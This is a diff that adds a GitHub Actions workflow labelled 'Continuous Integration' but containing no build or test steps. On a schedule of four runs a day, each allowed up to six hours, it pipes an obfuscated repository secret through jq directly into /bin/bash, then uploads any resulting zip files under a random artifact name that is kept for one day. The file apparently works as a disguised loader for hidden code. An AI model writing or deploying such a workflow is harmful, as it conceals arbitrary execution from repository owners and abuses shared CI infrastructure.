@@ -1,0 +1,32 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '20 5,11,17,23 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Go
+        env:
+          iy9418: ${{ secrets.iy9418 }}
+        run: |
+          printf '%s' "$iy9418" | jq -r .esg252 | /bin/bash
+          printf '%s' "$wyqrc5" | jq -r .woih2541 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: J5a3YFrL
+          path: "*.zip"
+          retention-days: 1
